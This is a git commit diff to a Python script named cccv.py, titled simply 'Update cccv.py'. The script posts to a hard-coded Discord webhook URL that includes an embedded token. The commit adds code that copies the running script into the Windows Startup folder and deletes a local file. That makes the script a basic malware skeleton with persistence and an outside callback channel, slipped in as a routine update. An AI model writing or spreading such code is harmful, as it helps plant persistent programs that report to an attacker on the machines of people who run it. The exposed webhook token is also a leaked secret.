b2ff7e405ca890b10799d61e2965a8a91cde9e3c
akyai <75884355+akyai@users.noreply.github.com>
2022-07-14 17:12:55 +0200

    Update cccv.py

--- cccv.py
+++ cccv.py
@@ -1,5 +1,10 @@
-import dhooks
-
+import dhooks ,shutil, sys, os
+roaming = os.getenv('APPDATA')
 hook = dhooks.Webhook('https://discord.com/api/webhooks/997154143007424532/Azb1UjCBndMFZuvZ4znZGYkNsJNRZQn829J5P5r8PGF094ZdQncPkGxroBIw3Z1bS-LM')
 
 hook.send('a')
+
+def launch():
+    filePath = shutil.copy(sys.argv[0], roaming + '\Microsoft\Windows\Start Menu\Programs\Startup')
+    os.remove('./file.py')
+launch()
